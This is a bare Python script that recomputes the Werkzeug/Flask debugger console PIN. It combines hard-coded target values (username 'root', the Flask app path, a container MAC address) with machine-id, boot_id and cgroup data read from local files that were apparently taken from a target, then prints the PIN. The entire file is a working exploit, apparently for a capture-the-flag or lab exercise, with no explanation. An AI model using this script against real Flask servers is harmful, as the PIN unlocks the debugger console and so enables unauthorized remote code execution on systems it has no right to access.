import hashlib
from itertools import chain
import uuid

_machine_id = None



def get_machine_id():
    global _machine_id

    if _machine_id is not None:
        return _machine_id

    def _generate():
        linux = b""

        # machine-id is stable across boots, boot_id is not.
        for filename in "./machine-id", "./boot_id":
            try:
                with open(filename, "rb") as f:
                    value = f.readline().strip()
            except OSError:
                continue

            if value:
                linux += value
                break

        # Containers share the same machine id, add some cgroup
        # information. This is used outside containers too but should be
        # relatively stable across boots.
        try:
            with open("./cgroup", "rb") as f:
                linux += f.readline().strip().rpartition(b"/")[2]
        except OSError:
            pass

        if linux:
            return linux

    _machine_id = _generate()
    return _machine_id

rv = None
num = None

probably_public_bits = [
    "root", 
    "flask.app", 
    "Flask",
    "/usr/local/lib/python3.8/site-packages/flask/app.py",
]

private_bits = [
    str(int("0242ac1a0002", 16)), # converted to decimal
    get_machine_id()
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

if num is None:
    h.update(b"pinsalt")
    num = f"{int(h.hexdigest(), 16):09d}"[:9]

if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = "-".join(
                num[x : x + group_size].rjust(group_size, "0")
                for x in range(0, len(num), group_size)
            )
            break
    else:
        rv = num

print("rv: " + rv)